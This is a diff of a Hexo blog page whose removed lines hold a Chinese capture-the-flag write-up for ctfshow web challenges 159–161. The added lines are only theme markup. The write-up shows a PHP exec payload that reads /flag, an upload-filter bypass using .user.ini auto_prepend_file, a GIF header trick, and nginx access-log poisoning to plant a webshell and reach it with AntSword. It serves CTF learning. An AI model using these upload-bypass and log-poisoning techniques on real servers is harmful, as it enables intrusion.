-<h5 id="与"><a href="#与" class="headerlink" title="[]与{}"></a>[]与{}</h5><p>“[]”” 和 “{}” 都可以用于访问数组中的元素，但是需要注意的是，”{}” 只适用于字符串索引，而不适用于数字索引。</p>
-<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><h5 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h5><blockquote>
-<p>system() 输出并返回最后一行shell结果。<br>exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。<br>passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。<br>相同点：都可以获得命令执行的状态码</p>
-</blockquote>
-<p>例子：</p>
-<p><code>&lt;?exec(“cat /flag &gt; 2.txt”)?&gt;</code></p>
-<p>将&#x2F;flag的内容覆盖到2.txt(不存在就创建)，&gt;&gt;是追加。如果目录权限不允许创建新文件，则该命令会报错。</p>
-<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>web158没有啥东西</p>
-<p>括号被屏蔽，使用反引号执行系统命令</p>
-<h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>日志包含，有点麻烦</p>
-<p>在前一题的基础上禁用了很多东西，空格，反引号和log给禁了（我已经不知道禁了多少东西）。</p>
-<p>如果文件包含和命令执行都不行，试试日志包含：</p>
-<p>第一个文件：.user.ini.png(抓包后改为：.user.ini)，内容：</p>
-<p>auto_prepend_file&#x3D;test_UA.png</p>
-<p>第二个文件：test_UA.png，内容：</p>
-<p><code>&lt;include”/var/lo”.&quot;g/nginx/access.lo&quot;.&quot;g&quot;&gt;</code>	不能有空格</p>
-<p>我原本打算直接打开日志，很明显没有权限且没用</p>
-<p>但是注入的内容可以让我通过&#x2F;upload包含日志，那我蚁剑连&#x2F;upload即可</p>
-<p>细节：</p>
-<p>直接输出日志，木马只是字符串，不生效</p>
-<p>include包含字符串，木马被当成PHP文件执行，木马在当前文件生效</p>
-<h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>改gif文件头：GIF85a，之后同web160</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/18/ctfshow%20WEB%E5%85%A5%E9%97%A8/" data-id="cltw5mgvm00009k7b0w5b67w1" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
+      <ul class="navbar-list">
         
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
+          <li class="navbar-list-item"><a href="/">首页</a></li>
         
-          <li>
-            <a href="/2024/03/18/ctfshow%20WEB%E5%85%A5%E9%97%A8/">(no title)</a>
-          </li>
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
         
       </ul>
     </div>
   </div>
+</nav>
 
   
-</aside>
+  
+    <div class="header-content">
+      <div class="post-text layout-block layout-padding">
+        <h1 class="title-wrap">Hexo</h1>
+        
+          <h2 class="title-sub-wrap">pq</h2>
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2024 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
-  </div>
-</footer>
+  
 
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+  
+</header>
+
+    <!-- 首页 -->
+
+<!-- post list container -->
+<div class="body-container">
+  <div class="content-container layout-block article-list">
+    
+      <div class="article-item layout-padding">
+        <article class="card-container article-card content-padding--large soft-size--large soft-style--box">
+          
+
+          <div class="card-text">
+            
+              <a href="/2024/03/18/ctfshow%20WEB%E5%85%A5%E9%97%A8/" itemprop="url">
+                <h2 class="card-text--title">(no title)</h2>
+              </a>
+            
+            <div class="card-text--row">
+              <span>发布于</span>
+              <time  class="article-date" datetime="2024-03-17T23:30:35.016Z" itemprop="datePublished">2024-03-18</time>
+            </div>
+            
+              <div class="last-time">
+                <span>更新于</span>
+                <time  class="article-updated" datetime="2024-03-12T12:34:59.515Z" itemprop="dateUpdated">2024-03-12</time>
+              </div>
+            
+            <ul class="wrap-list light">
+  
+</ul>
+            <ul class="wrap-list light">
+  
+</ul>
+          </div>
+        </article>
+      </div>
+    
+  </div>
+</div>
+
+<!-- page container -->
+
+
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+     
+    <p>&copy; 2024 <a href="/" target="_blank">steve-pq</a></p>
+
     
 
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+  
+
+
+  
 
 
 
@@ -515,9 +243,7 @@
 <script src="/js/script.js"></script>
 
 
-
-
-
-  </div>
+  
+  <!-- 尾部用户自定义相关内容 -->
 </body>
 </html>
